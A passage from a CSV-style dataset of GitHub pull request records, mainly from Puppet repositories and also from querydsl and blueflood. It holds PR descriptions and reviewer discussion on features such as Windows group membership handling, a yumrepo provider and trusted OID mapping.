tests are pending because `(#17808) MTU has not been implemented for HP-UX`. I\'m looking into that pull request as well (#369) but there is a comment on there that says ""All of these hacks can be removed by implementation of refactor (#17710)"". \r\n\r\nI\'m a little bit confused on the relationship between these two additions (17710 and 17808), could you maybe help clear this up for me? I\'m mainly trying to figure out if one needs to go in before the other, or if merging in one will change the way the other should be implemented, etc.']"
480,puppetlabs/puppet,1878.0,"This adds the 'contain' function. When used inside of a class definition, it
will create a containment relationship.","[""This may need checks for more error conditions. I'd appreciate suggestions around that."", 'CLA signed by all contributors.']"
481,puppetlabs/puppet,1884.0,"The docuementation is now for pson only, but mentiones the deprecated? yaml version.
There is a json-schema, a reference to the documentation for report format 4, and an example.

The schema is validated, and a test validates a generated report against the schema.","['CLA signed by all contributors.', 'CLA signed by all contributors.', 'This is close to done (I hope), but there are still some issues to resolve, and I want feedback on if this now looks ok.', 'Is this good to go now? @kylog ?', 'My only open question was on the ""deprecated formats"" section, and I wondered if @zaphod42 had thoughts on that part.', 'Reference to deprecated yaml removed, link to documentation updated, one commit squashed\r\nRebased.\r\nReady to go?']"
482,puppetlabs/puppet,1931.0,,"['CLA signed by all contributors.', ""~~@ferventcoder / @joshcooper you guys can have a look ... I'm still cleaning up a4e25c0 a bit.~~\r\n\r\n~~Looking for input particularly on a couple of the `TODOs` I left in there.  I tried to be careful about not exposing too much in the way of implementation details on some of the test changes, but a couple were tricky.~~"", ""I think I'm going to break up a4e25c0 a little bit as well.\r\n\r\n~~Travis is having beef with a few tests as well, but of course doesn't tell me why they're failing on Travis :smiling_imp:~~ \r\n\r\n\r\n~~Puppet::Util::ADSI::Group~~\r\n    ~~an instance~~\r\n      ~~should be able to add a member (FAILED - 1)~~\r\n      ~~should be able to remove a member (FAILED - 2)~~\r\n      ~~should be able to add a member by SID (FAILED - 3)~~\r\n      ~~should be able to remove a member by SID (FAILED - 4)~~\r\n      ~~should be able to add a list of users to a group (FAILED - 5)~~"", 'Did you try running the tests on something that is not windows? It could be your missing a stub or mock somewhere.', ""@joshcooper / @ferventcoder this is basically ready for merge.  A couple of points though that might be worth discussing:\r\n\r\n* I didn't implement the `insync` property like `scheduled_task` does.  My concern was that adding this would end up requiring changes to group implementations other than Windows, and I felt that was out of scope here.  It also wasn't something I was completely comfortable with (in the current timeframe) at the moment.  See https://github.com/puppetlabs/puppet/blob/master/lib/puppet/type/scheduled_task.rb#L158 \r\n* Do we have any acceptance tests for these?  Would this be the right spot to add -> https://github.com/puppetlabs/beaker/blob/master/lib/beaker/host/windows/group.rb\r\n* Any test that is marked with `:if => Puppet.features.microsoft_windows?` is clearly an integration test (or requires mocking Win32 libraries only loaded in Win32 environment).  I left them in the unit test source files because that's what other tests were doing.  Are we OK with this kind of hodgepodge?"", ""@joshcooper / @ferventcoder and one additional item I failed to bring up.\r\n\r\n* Should we log anything (like a warning) to the user when they have added multiple accounts by the same name, but in different forms?  For instance, 'SYSTEM' vs 'NT AUTHORITY\\SYSTEM'?"", 'Do we log anything or is the question should we log anything?', '@ferventcoder reworded as `should`', ""@Iristyle if you have changes to how the acceptance harness deals with windows hosts, they should probably go to https://github.com/puppetlabs/beaker which is puppet-acceptance's successor."", '@jpartlow thanks, I forgot about that.  Updated comment above accordingly.', 'So far looks good. I\'ve found a few issues I\'ll talk about below.\r\n\r\n~~### Managing Group Membership with non-existing group\r\nWhen I try to create a group and set existing members I get a cryptic error. I\'m running this with two real users. It could be in how I\'ve set up my manifest. (I\'ve done some searching on this and it seems that most don\'t use the members but rather set the group and manage group membership through each user - alas, I\'m not testing that aspect at the moment).~~\r\n  \r\n```\r\npuppet apply --trace --debug --verbose -e ""group{\'bob\': ensure => present, members => \'System,rob\', provider=> windows_adsi,}""\r\n```\r\n~~**Note**: If I define a single member like \'System\', it works appropriately.~~\r\n\r\n```\r\nError: undefined method `account\' for nil:NilClass\r\n```\r\n  \r\n~~What I\'d like to see here is a better error telling me it couldn\'t find the account \'System,rob\' which would help me realize I need to adjust my manifest appropriately~~\r\n\r\n~~### Managing Group Membership with changes to existing group~~\r\n\r\n~~I get a failure in another area...~~\r\n\r\n```\r\nError: /Group[bob]/members: change from [""SYSTEM""] to System,rob failed: undefined method `octet_string_to_sid\' for Puppet::Util::Windows::SID:Module\r\n```', 'So this works against a non-existent group:\r\n\r\n```\r\npuppet apply --trace --debug --verbose -e ""group{\'bob\': ensure => present, members => [\'System\',\'rob\'], provider=> windows_adsi,}""\r\n```\r\n\r\n~~But on a run with an existing group it fails with:~~\r\n\r\n```\r\nError: /Group[bob]/members: change from [""SYSTEM"", ""rob""] to System rob failed:\r\nundefined method `octet_string_to_sid\' for Puppet::Util::Windows::SID:Module \r\n```\r\n\r\nIf I apply the proper casing to user names (i.e. SYSTEM instead of System) it works appropriately.\r\n\r\nThis leads me to believe we need better error messages coming out.', '@ferventcoder great work, thanks for the reports.  Like a :poop: I failed to use `puppet apply` like I should have, so bad on me (training wheels still on apparently).\r\n\r\nI think in your first example, you\'re doing it wrong:\r\n\r\n```\r\npuppet apply --trace --debug --verbose -e ""group{\'bob\': ensure => present, members => \'System,rob\', provider=> windows_adsi,}""\r\n```\r\n\r\nLet\'s bring up the parsing of a comma separated user list as a single string with the team, and perhaps file a ticket on it.  At the very least, we should probably generate a warning.  IMHO, members should be an array.\r\n\r\nI will focus on what\'s up with that second issue.  The error about `undefined method \'octet_string_to_sid\' for Puppet::Util::Windows::SID:Module` seems a little odd, as if you\'re not using the latest code.  I\'m going to guess you forgot to `bundle exec puppet apply` -- but will verify anyhow.  I will also see if the issue with adding to an existing group is present in the code before these changes.\r\n\r\nThanks\r\n\r\n', ""Agreed that it's probably wrong to go comma separated since the top level type joins an array. Since there is zero documentation (I could find) on how you pass items to this, I gave it a shot the most primitive way first and worked up from there. :)"", ""@ferventcoder this is fixor'd now.  I think I'm going to write one more quick integration test that adds the same user multiple times to ensure nothing bad happens.\r\n\r\nThe issue with case was in the original `members_to_add = desired_members - current_members`.  Ruby compares the entire object for equality instead of just the SID like we need.\r\n\r\nMy reworked version is a little ugly:\r\n\r\n```ruby\r\nmembers_to_add = desired_members.reject { |d| current_members.index { |c| c.to_s == d.to_s } }\r\n```\r\n\r\n\r\nSeems like there should be a better syntactic way to tell Ruby to diff the arrays on just a single attribute.\r\n"", 'So now it is not having issues anymore setting users on a group, but it is reporting that it is doing something when it is not. This has to do with different casing I imagine... thus the SYSTEM user...\r\n\r\n```\r\n> bundle exec puppet apply -e ""group {\'bob\': ensure=> present, members => [\'System\',\'rob\'],}""\r\nNotice: Compiled catalog for machine.localdomain in environment production in 0.45 seconds\r\nNotice: /Group[bob]/members: members changed \'SYSTEM,rob\' to \'System,rob\'\r\nNotice: Finished catalog run in 0.25 seconds\r\n```\r\n\r\nIt should report no change.\r\n\r\nFor reference, \r\n\r\n\r\n```\r\n> bundle exec puppet apply -e ""group {\'bob\': ensure=> present, members => [\'SYSTEM\',\'rob\'],}""\r\nNotice: Compiled catalog for machine.localdomain in environment production in 0.42 seconds\r\nNotice: Finished catalog run in 0.25 seconds\r\n```\r\n\r\nGranted this is an issue with casing, but I don\'t know whether we make that a known issue or resolve that now...', 'Okay, this is an issue that I feel we definitely need to resolve. It would potentially affect every domain user that would be managed. Note below that I used the full system account `NT AUTHORITY\\SYSTEM` and it reported changing the group. I ran it again and it reported changing the group. Reporting it as a change every time is a no go.\r\n\r\n```\r\n> bundle exec puppet apply -e ""group {\'bob\': ensure=> present, members => [\'NT AUTHORITY\\SYSTEM\',\'rob\'],}""\r\nNotice: Compiled catalog for machine.localdomain in environment production in 0.45 seconds\r\nNotice: /Group[bob]/members: members changed \'SYSTEM,rob\' to \'NT AUTHORITY\\SYSTEM,rob\'\r\nNotice: Finished catalog run in 0.27 seconds\r\n```', 'I\'m also seeing puppet issue NetBIOS name queries for the domain component, which undoes the change made here: https://github.com/puppetlabs/puppet/pull/1663\r\n\r\n<pre>\r\nC:\\work\\puppet>bundle exec puppet apply -e ""group {\'bobs\': ensure=> present, members => [\'NT AUTHORITY\\SYSTEM\',\'albert\'],}""\r\n</pre>\r\n\r\nThen in wireshark with filter `udp.port == 137`, I see:\r\n<pre>\r\n46\t88.293940000\t172.16.138.146\t172.16.138.2\tNBNS\t92\tName query NB NT AUTHORITY&lt;20>\r\n</pre>\r\n', ""@joshcooper Should we convert well-known local accounts? Besides `NT AUTHORITY\\account`, `BUILTIN\\group`, and `MACHINENAME\\accountorgroup`, what other items are there that we could potentially convert to '.'?"", ""@joshcooper crap-o on the NetBIOS requests.  I didn't see that in previous history... that's going to be an issue I think here because I believe the SID constructor is doing that.  But I'm not sure of how we're going to get a SID to compare without doing a lookup.  I will have to dig in on that one a bit more... thanks for the heads up."", ""@Iristyle @ferventcoder One place where this sort of thing has come up before is the file [`owner`](https://github.com/puppetlabs/puppet/blob/master/lib/puppet/type/file/owner.rb#L16-L42) property. Puppet will automatically call the [provider's getter method](https://github.com/puppetlabs/puppet/blob/master/lib/puppet/property.rb#L470) to return the `current` value. On Windows, this returns the [canonicalized SID value](https://github.com/puppetlabs/puppet/blob/master/lib/puppet/provider/file/windows.rb#L37). Puppet then calls the [`Property#insync?`](https://github.com/puppetlabs/puppet/blob/master/lib/puppet/property.rb#L345) method, which the file [`owner`](https://github.com/puppetlabs/puppet/blob/master/lib/puppet/type/file/owner.rb#L16) property overrides. The `insync?` method calls out to the provider to canonicalize the desired (aka `should`) value and make sure that the current value matches at least one of the should values.\r\n\r\nI think we want to do something similar for the group's members and user's groups. However, in that case we're a [List derived property](https://github.com/puppetlabs/puppet/blob/master/lib/puppet/type/user.rb#L252).\r\n"", '@joshcooper / @ferventcoder updated once again ;0  All previous issues addressed AFAIK (deprecation warnings, slow algorithms, etc).\r\n\r\n### Initial Creation\r\n\r\n```shell\r\nbundle exec puppet apply --trace --debug --verbose -e ""group{\'new_group\': ensure => present, members => [\'SYSTEM\',\'Administrator\'], provider=> windows_adsi,}""\r\n```\r\n\r\n##### Output \r\n\r\n```\r\nNotice: /Group[new_group]/ensure: created\r\n```\r\n\r\n### Group Changed\r\n\r\n```shell\r\nbundle exec puppet apply --trace --debug --verbose -e ""group{\'new_group\': ensure => present, members => [\'SYSTEM\'], provider=> windows_adsi,}""\r\n```\r\n\r\n##### Output\r\n\r\n```\r\nNotice: /Group[new_group]/members: members changed \'NT AUTHORITY\\SYSTEM (S-1-5-18),VAGRANT-2008R2\\Administrator (S-1-5-21-271343509-1886877197-423808128-500)\'\r\n to \'NT AUTHORITY\\SYSTEM (S-1-5-18)\'\r\n```\r\n\r\n### Change back to original (but change case)\r\n\r\n```shell\r\n bundle exec puppet apply --trace --debug --verbose -e ""group{\'new_group\': ensure => present, members => [\'system\',\'administrator\'], provider=> windows_adsi,}""\r\n```\r\n\r\n##### Output\r\n\r\n```\r\nNotice: /Group[new_group]/members: members changed \'NT AUTHORITY\\SYSTEM (S-1-5-18)\' to \'NT AUTHORITY\\system (S-1-5-18),VAGRANT-2008R2\\administrator (S-1-5-21-271343509-1886877197-423808128-500)\'\r\n```\r\n\r\n### Same users, different case (yay -- no op!)\r\n\r\n```shell\r\n bundle exec puppet apply --trace --debug --verbose -e ""group{\'new_group\': ensure => present, members => [\'SyStEm\',\'AdMiNiStRaToR\'], provider=> windows_adsi,}""\r\n```\r\n\r\n##### Output\r\n\r\n```\r\nNotice: Finished catalog run in 0.08 seconds\r\n```\r\n', ""So I think there are a few more improvements to be made, but I think that they should go in separate tickets based on a bit of creep that this has gone through\r\n\r\n* This PR only affects the groups to users relationship, but not the reverse -- I think the reverse situation should be a new ticket\r\n* Initial group creation output doesn't list members (but changes do) -- this seems weird to me\r\n"", 'Man, what a PR this turned into.. haha.', 'Since you start earlier than I do, I wanted to summarize where we are, so I can pick up tomorrow. I think the remaining issues are:\r\n\r\n- [x] hash comparison of current and desired group members\r\n- [x] raise when `name_to_sid_object` returns nil (attempting to add/remove an non-existent user)\r\n- [x] resolve the `members_insync?` method\r\n\r\n- [x] Also could you update the PR message to not say WIP?', 'No problem.. I planned on removing the `WIP` moniker, and cleaning up / squashing commits where appropriate as soon as this was actually ready for a final pass / merge.', ""OK @joshcooper and @ferventcoder -- this is all of it I think.\r\n\r\nI left 3475472 as a last commit to fixup with 572be53 -- and will probably want to tweak commit msg a little bit.\r\n\r\nI think that this is now the correct behavior when SIDs don't exist for the `insync?` check.... but wanted to completely verify."", ""Argggg... in local `bundle exec apply`, things are now blowing up mysteriously.  Hold the merge.. sigh.\r\n\r\nI'm working through it, but seeing some very peculiar behavior specifically when a new group is created (can't resolve the Uris to existing users)"", ""OK, so I  found a solution, and while doing so, just realized I was probably wasting some cycles on extraneous domain /user lookups once the SID has been resolved.\r\n\r\nI checked the docs for [IAdsGroup::Add](http://msdn.microsoft.com/en-us/library/windows/desktop/aa706022\\(v=vs.85\\).aspx), and sure enough there's another `WinNT://` syntax acceptable.  So now I feel pretty dumb, since this is completely legit:\r\n\r\n```\r\nWinNT://S-1-5-21-35135249072896\r\n```\r\n\r\nI've updated the code a little bit to handle this, writing a couple more tests, and fixing some other tests that are now broken (mostly mocked calls).\r\n\r\nI'm not still not quite sure the root cause of my underlying issues (even after playing around in the debugger, `WIN32OLE.connect('WinNT://NT Authority/SYSTEM,user')` was failing, but `WIN32OLE.connect('WinNT://SYSTEM')` was not, but *only* in the context of this one point in the call stack on a __new__ group creation-- very weird)."", ""Ok @joshcooper have a look at 3475472 and d33cb50  \r\n\r\nI will rebase this into prev commits and re-push as soon as I can get a set of eyes on this to confirm I'm not totally :nut_and_bolt: ""]"
483,puppetlabs/puppet,2086.0,"[I've made this PR early, as I'd like feedback on the direction of the provider/type, and the tests.  It seems to work for me, which is about as strongly tested as it is right now.]

This work strips out all of the provider code from the type, and
creates a new ruby provider for yumrepo.

While this code still uses inifile it's been rewritten to take advantage
of the modernization of Puppet.  It's now a little easier to understand
and test.","['CLA signed by all contributors.', 'Related tickets:\r\n\r\n[Redmine 8758](http://projects.puppetlabs.com/issues/8758)\r\n[Redmine 9293](http://projects.puppetlabs.com/issues/9293)', 'Also incorporates [Redmine 22304](http://projects.puppetlabs.com/issues/22304)', '@apenney from the yum config parser: http://yum.baseurl.org/gitweb?p=yum.git;a=blob;f=yum/config.py#l387\r\n\r\n    class BoolOption(Option):\r\n        """"""An option representing a boolean value.  The value can be one\r\n            of 0, 1, yes, no, true, or false.\r\n            """"""\r\n\r\nSeems like yum\'s boolean options also take yes and no in addition to (0|1|false|true).  This might be worth expanding into the rest of yumrepos options.', ""Ahhhh, nice, I didn't look in config.py, I had only got as far as repo.py.  That'll teach me.  I'll fix this globally."", ""I'll keep working on this.  I'll make sure self.reposdir is covered as well."", ""Hey, for #2268, you can now pull from 459933292 il you're okay with this.\r\n\r\nCheers"", ""@apenney I noticed that travis failed on commits 866f5c5 and 537b6f4. Could you fix those up? That way it's easier to bisect in the future."", 'Merged into master in e638972; this should be released in 3.5.0. Thanks for all your hard work!', ""I agree, I'll go though and do the needful shortly.""]"
484,puppetlabs/puppet,2456.0,"This patch changes the logic of how test packages are installed on SUTs.
Currently, repo packages are pulled by the individual SUTs - this works
because we assume that the SUTs are located within the Puppet Labs
network and can access builds.puppetlabs.lan.  To run acceptance tests
in the cloud the workflow needs to be changed to have the test packages
pushed to the SUTs by the jenkins master node.

Tested successfully on jenkins, also updated spec tests.

This code relies on Beaker 1.8+ DSL methods.","['CLA signed by all contributors.', ""I've update to make the wget call quieter (added --nv (not verbose) option)."", 'Updated to use URI, cleaned up the cut-dirs determination.', ""The Travis build failed for what looks to be spurious reasons; I'm restarting it."", 'Travis seems to be reliably failing on Ruby 2.1.0: (https://travis-ci.org/puppetlabs/puppet/jobs/24140663)', ""The spec failures are unrelated to this change; I'm merging it in."", 'Merged into master in 334acf3.']"
485,puppetlabs/puppet,3099.0,"The beaker host['distmoduledir'] variable is not meaningful if the
host is using directory environments (e.g. 'production').

This commit updates the helper methods for validating that a module
is (or is not) installed on the host by iterating over the
modulepath if a specific modulepath is not provided.

The calls to these helper methods have been updated for the change
in parameter ordering in the helper methods.","['CLA signed by all contributors.', ""Also, let's rebase this to stable and we'll merge up from there; since there's still discussion of a Puppet 3.7.2 and the pe-puppet 3.4.x is targeted to the 3.7.x puppet stable atm."", '@jpartlow this has already been rebased on stable. Cheers.', ""The PR's still targeting master though?"", ""@jpartlow this is the error I get if the environmentpath is not amended with the given path in the setup method.\r\n\r\n\r\n      * Install a module into a non default legacy environment\r\n\r\n    centos6-64-ma 14:33:40$  puppet module install pmtacceptance-nginx --config=/tmp/environmentpath.Dygiq5/puppet2.conf --environment=legacyenv  \r\n    /opt/puppet/lib/ruby/site_ruby/1.9.1/puppet/application.rb:365:in `run': Could not find a directory environment named 'legacyenv' anywhere in the path: /etc/puppetlabs/puppet/environments. Does the directory exist? (Puppet::Environments::EnvironmentNotFound)\r\n        from /opt/puppet/lib/ruby/site_ruby/1.9.1/puppet/util/command_line.rb:146:in `run'\r\n        from /opt/puppet/lib/ruby/site_ruby/1.9.1/puppet/util/command_line.rb:92:in `execute'\r\n        from /usr/local/bin/puppet:8:in `<main>'\r\n"", 'Ah, ok, I think what is going on.  We are inheriting the original puppet.conf settings (sourced from $settings::config), and they now have environmentpath set, so that legacyenv is being ignored.  So we do need to set environmentpath in the generate_base_legacy_and_directory_environments() method, but we want to set it to an empty string to begin with (clear it, essentially).', 'This PR needs to be reopened against the puppet stable branch.']"
486,puppetlabs/puppet,2919.0,"* This patch is a proposal(that's why filename is hard-coded) that allows trusted facts users to map their
custom OIDs to user-friendly names that can be used in puppet manifests.

For instance a mapping file such as

```
# /etc/puppet/trusted_oid_mapping.yaml
---
oid_mapping:
  - ['1.3.6.1.4.1.34380.1.2.1.1', 'shortname', 'Long name']
  - ['1.3.6.1.4.1.34380.1.2.1.2', 'othershortname', 'Other Long name']
```

could be used to obtain `$trusted[extensions][shortname]`.


* If the oid mapping is not done at this level, each site that wants to
use custom trusted facts extensions would have to write its own
`oid_to_name` puppet function that traverse the `$trusted[extensions]`
hash and replace _OIDs_ with friendly names.

_Note_: I couldn't succeed to add a configuration option for this as the
`puppet/ssl/oids` library seems to be loaded very early and I don't have much time to dig deeper.","['CLA signed by all contributors.', '@riton thanks for this contribution!  One thing we need, in order to pull this in is an associated Jira issue.  Would you create one at http://tickets.puppetlabs.com and then amend the commit to include the ticket number (see the CONTRIBUTING.md for details).', ""Hi @jpartlow, I've just amended my commit message and Jira issue has been opened here :: https://tickets.puppetlabs.com/browse/PUP-2995.\r\n"", ""@riton thanks for this contribution! I had something like this in mind when I was adding the initial custom SSL attributes and I'm happy with the structure of the custom OID file. We do need to make sure that the OID file path isn't hardcoded, but I'll provide some pointers inline in the diff."", '@adrienthebo, very good idea, using _hooks_ does the job !', ""@Iristyle , I've just removed the class level state thing and everything seems to work seamlessly.\r\nMy idea behind this class level state was that the hook is called twice:\r\n - the first time the `trusted_oid_map_file` hook is called, the parameter will be the _default_ value `$confdir/trusted_oid_map.yaml`.\r\n - the second time, the hook is called with the value the user defined in `puppet.conf`.\r\n\r\nNow that I removed this class level state from `defaults.rb`, with a configuration file `puppet.conf` of \r\n\r\n```\r\n# cat /etc/puppet/puppet.conf\r\n[...]\r\n[master]\r\n  [...]\r\n  trusted_node_data = true\r\n  trusted_oid_mapping_file = $confdir/my_custom_oid_mapping.yaml\r\n```\r\ntrusted OIDs will be loaded from two distinct files (it they exist): `$confdir/trusted_oid_map.yaml` AND `$confdir/my_custom_oid_mapping.yaml`. That's the behavior I'm seeing on my test puppet infrastructure.\r\n\r\nAny idea how to avoid that without managing this class level state ?"", ""ping @adrienthebo - it looks like we might not want to use the hook here, but instead defer the parsing of the oids to later in the Puppet lifecycle.  Then we don't have to worry about loading / registering OIDs multiple times.\r\n\r\nWould perhaps https://github.com/puppetlabs/puppet/blob/cb4ad1f19b043a70ba17e4103a25f5c97a76948b/lib/puppet/ssl/host.rb#L182-L186 be an appropriate place to load oids, similarly to how `csr_attributes` are handled?"", ""I believe the reason for the double invocation is [this call](https://github.com/puppetlabs/puppet/blob/master/lib/puppet/settings.rb#L329), which appears spurious on first glance.\r\n\r\nRemoving it does break some tests, but it might bear investigating. Or explaining by someone who's in the know."", '@Iristyle good by me; I think this should probably handled as part of initialization/running in `application.rb`.', 'https://github.com/puppetlabs/puppet/blob/master/lib/puppet/application.rb#L395-L397 is probably a better place to run setup steps like this.', ""@riton did you see @joshcooper's code comments and @adrienthebo's idea for how to avoid the double file read (which involves not using the hooks)?"", ""@adrienthebo , @kylog, sorry for the delay.\r\n@adrienthebo, good idea, actually, https://github.com/puppetlabs/puppet/blob/master/lib/puppet/application/master.rb#L255-L269 should be a better place don't you think ?"", 'https://github.com/puppetlabs/puppet/blob/master/lib/puppet/application/master.rb#L234-L243 should be even better.', ""@adrienthebo, I've just pushed an updated version.\r\nThis new version only involves _custom OID loading_ if `trusted_node_data` has been activated."", 'We may need to have this available on the agent as well, so that the agent can read csr_attributes with custom attributes using the OID short name and insert the numeric OID into the CSR correctly. That being said we could have a general `setup_ssl` method in `Puppet::Application` and have separate implementations in the master and agent for this.', 'But yes, I like this approach a lot more.', 'Merged to master at fa24c6bbc01f5ca9c1daf3fe105649f59aa8d032 after a touch up of ParseError (changed to Puppet::Error).', '@riton thanks for the contribution! This will be released in puppet 4.0.']"
487,puppetlabs/puppet,3233.0,"When the future parser called the error method from within the parser
(the few remaining cases handled by the parser directly), that resulted
in the Factory being called to produce new expressions and these were
subsequently turned into strings - showing a series of (slice ...)
s-expression.

The error method was simply doing the wrong thing (copied from the 3x
parser). This commit fixes the problem by picking up as much as possible
of the known location and passing that along in the exception that is
raised.

One test is included to ensure we do not have regressions on this
behavior. The remaining error cases are still untested, but the
intention is for those to be moved out from the grammar and into
validation to improve the ability to give better error messages.

This commit only fixes the immediate problem of getting garbage output
instead of file, line and position in these cases.",['CLA signed by all contributors.']
488,puppetlabs/puppet,3609.0,"This repurposes the 4x lookup function to be the agnostic data lookup function working across global/environments and modules with merge behavior being the same as in hiera. hiera_array, and hiera_hash.

This PR consist of four commits because they cover separate tasks. See comment in each commit for more detail.","['CLA signed by all contributors.', 'Done with first pass of review - looks good in general, only small picky comments about docs and some small readability issues. We may need to look at errors again - they are very important since it is very easy for users to make mistakes (yaml data an configuration... small nuances in messages makes a big difference where we send them looking for the problem...)', 'Second review pass done. Only minor things left.']"
489,puppetlabs/puppet,3840.0,"Before this, the 3x defined() function beahaves in a strange way when
giving undef and empty string as input. A user may want to check if a
variable is defined and calls:
```
defined($not_defined)
```
and becomes surprised when true is returned even if the variable is not
defined. The user should have asked for:
```
defined('$not_defined')
```
This anomaly is caused by the 3.x functions inability to distinquish
between undef and an empty string, and the strange naming of the
Class[main] which is called '' (the empty string) internally, and 'main'
externally.

This commit fixes this problem by adding a 4.x implementation of the
defined() function. This version:
* does not accept undef input (protects users from the mistake of
  defined($foo)).
* the empty string produces false
* the string 'main' produces true (note that there is always a main
class)

The documentation for the 3x defined function is also updated to reflect
this (to avoid confusion).

This also fixes the ticket PUP-4331 since what it suggest (giving an
error when given undef) is implmented by typing the arguments to the
function.","['CLA signed by all contributors.', 'Hm problems with Ruby 1.8.7. And this problem actually unveiled a different issue... brb', 'Suggest deferring this until [PUP-4438](https://tickets.puppetlabs.com/browse/PUP-4438) has been fixed.', 'This PR was rebased and the new functionality from pup 4438 was used. A problem was found with weaving and repeated parameter. I added a fix for that (commit e9787bf in this PR) and could then use the new feature.', '@thallgren review-comments addressed, rebased on top of change to check that required does not follow optional']"
490,puppetlabs/puppet,1699.0,"The current `mount` core type has open issues (some are a couple of years old) and this pull request attempts to fix some of them. I am fully aware of the ""split the mount type in mounttab and mountpoint""-project (http://projects.puppetlabs.com/issues/7188) but I don't see any activity to merge this into core.

So I'd rather see these fixes merged even though they might become obsolete in the future.

This patchset includes fixes for
- http://projects.puppetlabs.com/issues/6409 (Mount provider should reject spaces in fstab fields)
- http://projects.puppetlabs.com/issues/4689 (mount resource for nfs share gives error)
- http://projects.puppetlabs.com/issues/6793 (mount provider fails when paths have a trailing slash)
- http://projects.puppetlabs.com/issues/21168 (mount property ""pass"" should default to ""-"" on Solaris)
- http://projects.puppetlabs.com/issues/15837 (mount with options specified on Linux)
- http://projects.puppetlabs.com/issues/7791 (puppet should reject certain options when running mount -o)
","['CLA Signed by stschulte on 2010-11-30 21:00:00 -0800', ""please don't merge. It causes other spec tests to fail"", 'I removed the `title_pattern` method and squashed a few commits together', 'summary: merged into master in 67e1ff6. This should be released in 3.3.0. Thanks for the contribution!']"
491,puppetlabs/puppet,1793.0,,"['CLA signed by all contributors.', ""I've tested this off of this branch, and it meets my needs for PE-943/PP-153, so I'm +1 and would love to see this get merged early next week."", ""I was getting ready to merge this, but I'm seeing  spec failures--@kylog are you seeing any locally?  We can figure this out in the morning."", 'Whoops!  Trying again ...', 'Specs are passing, will merge this now.', 'Merged in 212042c', 'Thanks!']"
492,puppetlabs/puppetlabs-rabbitmq,301.0,"RabbitMQ was not respecting this setting. The format of the configuration file was incorrect. This patch updates to bring this in line with documentation.

  The format reference example is given in https://www.rabbitmq.com/ssl.html#disabling-tls-versions
  Also add version list for rabbitmq_management config ssl_opts.
","[""Looks like you'll need to update the rspec tests as well. Line 521 of `spec/classes/rabbitmq_spec.rb` should be the only modification needed."", 'Just saw the rspec failures, thanks. Will get these updated as soon as I get these running myself.', 'Thanks @dalees and @jtopjian!']"
493,puppetlabs/puppetlabs-rabbitmq,71.0,"This is a WIP but I wanted to get the PR up so people working on features can see what I'm doing here.

The intent of this is to:

* fix installation on RHEL so we don't have duplicate package resources
* Make sure we can use rabbitmq 3.x because come on!
* Start restructuring things to make it easier to develop further.","[""Please also remove the default providers (that just fail). I'm pretty sure it was a hack to deal with optional_commands (so you can install package and use provider in same run). I'm pretty sure this has been fixed in Puppet 2.7.x. cc: @bodepd to see if he has any objections.\r\n\r\nI'll try to find some time to get the REST providers we use internally synced with this repo (requires transports). "", ""Providers work is definitely planned, I'm just trying to break it into smaller steps this time as the scope of the work is larger, it's so hard to review PRs that redo everything at once and this is already going to make @hunner groan at the size. :)"", ""K, I'll keep that in mind. I'll try to send a PR regarding that. I wish I had more bandwidth at the moment to tackle some of these since they are things we use internally and I'd rather not maintain a fork."", ""Even if you don't get time to send in PRs you can always point me at the forks and I can diff between them and work out how to integrate things as I go.  This work is proving to be a horrible nightmare so far. :)\r\n\r\n(I am struggling with dependency chains as rabbitmq_plugin needs to restart the service and other boring stuff.)"", 'The last commit is just for nanliu :+1: ']"
494,puppetlabs/puppetlabs-stdlib,184.0,"    (#20681) fix behaviour of delete_undef_values
    
    The issue #20681 describe the error of delete() function
    removing the elements from the origin array/hash/string.
    
    This issue affected other delete functions. Because
    ruby delete and delete_if functions make destructive
    changes to the origin array/hash.
    
    The delete_undef_values removed elements from the
    origin array/hash and this is not the desired behaviour.
    
    To solve this, we should dup or clone the array/hash
    before using the delete or delete_if ruby functions.
    
    We should also check if args[0] is not nil before using
    dup, since dup on nil raises exception.
    
    This fix the problem and add unit tests, so we could
    enforce this behaviour and prevent regressions.
","['Thank you very much for this contribution! Could this have the commit fixed up like GH-182 and GH-183 before I merge it?', 'sure! :-) ', 'Thanks for your suggestion, it is much better now! :-D ', 'The travis-ci build failed (https://travis-ci.org/puppetlabs/puppetlabs-stdlib/jobs/11480648#L927), https://github.com/puppetlabs/puppetlabs-stdlib/pull/184/files#L0R24 should be `got #{args[0]}` instead of `got #{arg[0]}`', '@adrienthebo  ... typo fixed. ', 'summary: merged into master in 7ccf8cf; thanks for the contribution!', 'Thanks for merging! :-) ']"
495,querydsl/querydsl,1131.0,Fixes #610,"['@Shredder121 Could you take a look at the changes?', 'Yes I can, and I will.', 'I will in the end again try to combine the commits.', 'I combined now the commits.', '@Shredder121 Is this good to merge?', 'Can you maybe remove all `@SuppressWarnings` in UnionImpl?\r\nBecause of the raw type `Query` the compiler highlights all the calls, but it is easily fixed.', 'Done', ""Looks good now.\r\nI'll merge it when the build succeeds.""]"
496,querydsl/querydsl,1263.0,Backport https://github.com/querydsl/querydsl/pull/1279,"['Have you also looked at the Korean docs? /sarcasm\r\n\r\nNo it looks good, do you still want to weed through more of the documentation?', 'For this a backport variant could be created as well.', 'That is very true, and reminds me of [a question about the documentation](https://github.com/querydsl/querydsl/pull/1246#issuecomment-78156831).', ""You can leave this one open for a little bit longer. I'm working on a different bug and have been fixing little typos as I find them. I'll backport this when it comes time to close it."", '@johnktims This looks good to me. Shall I merge it, or do you still want to push something?', 'I think this is good to go.', 'Are there any changes that still need to be made here?', 'Do we have entries on the AntMetadataExporter in the reference documentation?\r\nIf there is a table with the configuration options, it is good to see if they match the Javadoc.', 'Wow, this covers quite a lot. It looks good to me. \r\n\r\n@Shredder121 The AntMetadataExporter config entries are the same as for the Maven plugin http://www.querydsl.com/static/querydsl/3.6.2/reference/html/ch02s03.html#d0e961', ""That's good, only one table to maintain.\r\nThen I suppose the content of said table matches the Javadoc.\r\nSo in my opinion there are no further changes that need to be made here."", 'I put the reminder for the backport into the main comment.']"
497,querydsl/querydsl,1377.0,,"['I fixed now the `Step class` usage.', '@johnktims @Shredder121 Is this ok to merge?', ':+1: ', 'Yes, this is good. :+1: ']"
498,querydsl/querydsl,1382.0,Fixes #1379 ,"['@johnktims @Shredder121 Is this ok to merge?', 'This PR looks good to me. @Shredder121 ?', ""Yes, it looks good now.\r\nFor the sake of completeness I'd say let the build finish, and then I'll merge it.\r\nOr you can do it as well.""]"
499,rackerlabs/blueflood,460.0,"Made a number of fixes/enhancements to the finder:

1. Graphite requires the datapoints returned by the finder to be 
equidistant in time, (interleaved with Null datapoints if necessary.)
We weren't doing this so the timescale was off on graphs with sparse data.

